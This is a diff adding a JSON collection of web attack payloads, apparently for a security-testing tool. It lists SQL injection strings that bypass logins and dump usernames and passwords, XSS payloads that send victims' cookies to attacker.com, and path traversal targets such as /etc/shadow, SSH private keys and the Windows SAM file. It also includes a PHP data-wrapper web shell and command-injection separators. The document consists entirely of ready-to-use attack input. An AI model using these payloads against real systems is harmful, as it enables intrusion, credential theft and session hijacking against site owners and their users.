@@ -1,0 +1,134 @@
+{
+  "sqli": {
+    "auth_bypass": [
+      "admin' OR '1'='1'--",
+      "admin'--",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "admin' OR '1'='1' #",
+      "admin' OR 1=1/*",
+      "' or 1=1--",
+      "' or 1=1#",
+      "' or 1=1/*",
+      "') or '1'='1--",
+      "') or ('1'='1--"
+    ],
+    "union_based": [
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "' UNION SELECT database(),NULL,NULL--",
+      "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
+      "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
+      "' UNION SELECT username,password,email FROM users--",
+      "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--"
+    ],
+    "boolean_blind": [
+      "' AND '1'='1",
+      "' AND '1'='2",
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND SUBSTRING(database(),1,1)='a'--",
+      "' AND SUBSTRING(database(),1,1)='b'--",
+      "' AND LENGTH(database())=1--",
+      "' AND (SELECT COUNT(*) FROM users)>0--"
+    ],
+    "time_based": [
+      "' AND SLEEP(5)--",
+      "' AND IF(1=1, SLEEP(5), 0)--",
+      "' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--",
+      "'; WAITFOR DELAY '00:00:05'--",
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+      "' AND BENCHMARK(5000000,MD5('test'))--"
+    ],
+    "error_based": [
+      "' AND 1=CONVERT(int, (SELECT @@version))--",
+      "' AND 1=CONVERT(int, (SELECT database()))--",
+      "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))--",
+      "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT database())), 1)--"
+    ]
+  },
+  "xss": {
+    "basic": [
+      "<script>alert(1)</script>",
+      "<script>alert('XSS')</script>",
+      "<script>alert(document.domain)</script>",
+      "<script>alert(document.cookie)</script>"
+    ],
+    "img_tag": [
+      "<img src=x onerror=alert(1)>",
+      "<img src=x onerror=alert('XSS')>",
+      "<img src=x onerror=alert(document.cookie)>",
+      "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>"
+    ],
+    "svg": [
+      "<svg onload=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "<svg><script>alert(1)</script></svg>"
+    ],
+    "event_handlers": [
+      "<body onload=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<select autofocus onfocus=alert(1)>",
+      "<textarea autofocus onfocus=alert(1)>",
+      "<marquee onstart=alert(1)>"
+    ],
+    "cookie_theft": [
+      "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
+      "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
+      "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
+    ]
+  },
+  "lfi": {
+    "linux": [
+      "../../../../etc/passwd",
+      "../../../../etc/shadow",
+      "../../../../etc/hosts",
+      "../../../../etc/hostname",
+      "../../../../etc/issue",
+      "../../../../proc/self/environ",
+      "../../../../var/log/apache2/access.log",
+      "../../../../var/log/apache2/error.log",
+      "../../../../var/www/html/config.php",
+      "../../../../home/user/.bash_history",
+      "../../../../home/user/.ssh/id_rsa"
+    ],
+    "windows": [
+      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\boot.ini",
+      "..\\..\\..\\..\\windows\\system32\\config\\sam",
+      "..\\..\\..\\..\\inetpub\\wwwroot\\web.config"
+    ],
+    "wrappers": [
+      "php://filter/convert.base64-encode/resource=config.php",
+      "php://filter/convert.base64-encode/resource=index.php",
+      "php://input",
+      "data://text/plain,<?php system($_GET['cmd']); ?>",
+      "expect://whoami"
+    ]
+  },
+  "command_injection": {
+    "linux": [
+      "; whoami",
+      "| whoami",
+      "|| whoami",
+      "& whoami",
+      "&& whoami",
+      "`whoami`",
+      "$(whoami)",
+      "; id",
+      "; cat /etc/passwd",
+      "; ls -la"
+    ],
+    "windows": [
+      "& whoami",
+      "| whoami",
+      "&& whoami",
+      "|| whoami",
+      "& dir",
+      "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
+    ]
+  }
+}
